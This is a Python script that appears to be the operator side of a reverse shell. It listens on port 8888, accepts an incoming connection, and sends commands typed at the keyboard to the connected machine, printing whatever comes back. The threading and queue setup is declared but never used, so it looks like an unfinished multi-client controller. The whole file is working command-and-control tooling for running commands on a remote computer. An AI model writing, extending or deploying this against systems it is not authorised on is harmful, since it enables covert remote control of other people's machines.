#!/usr/bin/env python

import socket
import sys
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket (allows two computers to connet)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 8888
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error:" + str(msg))


# Bind socket to a port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port:", str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error: ", str(msg), '\n', 'Retrying')

# Accept multiple clients and save to list
def socket_accept():
    conn, address = s.accept()
    print("connection has been set up | "+ "IP " + address[0]+ " | Port ", str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            print("Closing connection to | IP")
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

# The main loop
def main():
    socket_create()
    socket_bind()
    socket_accept()
if __name__ == "__main__":
    main()
